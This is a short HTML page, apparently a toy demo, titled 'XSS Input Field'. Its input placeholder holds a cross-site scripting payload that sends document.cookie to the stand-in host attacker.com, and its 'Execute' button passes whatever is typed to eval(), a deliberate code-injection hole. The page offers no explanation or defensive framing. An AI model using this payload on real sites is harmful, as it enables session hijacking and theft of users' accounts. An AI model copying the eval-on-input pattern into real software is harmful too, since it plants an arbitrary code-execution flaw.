<!DOCTYPE html>
<html>
<head>
    <title>XSS Input Field</title>
</head>
<body>
    <h2>XSS Payload Input</h2>
    <input type="text" id="xssPayload" placeholder='"><script>new Image().src="http://attacker.com" + document.cookie;</script>' size="100">
    <button onclick="executeXSS()">Execute</button>

    <script>
        function executeXSS() {
            var payload = document.getElementById('xssPayload').value;
            eval(payload);
        }
    </script>
</body>
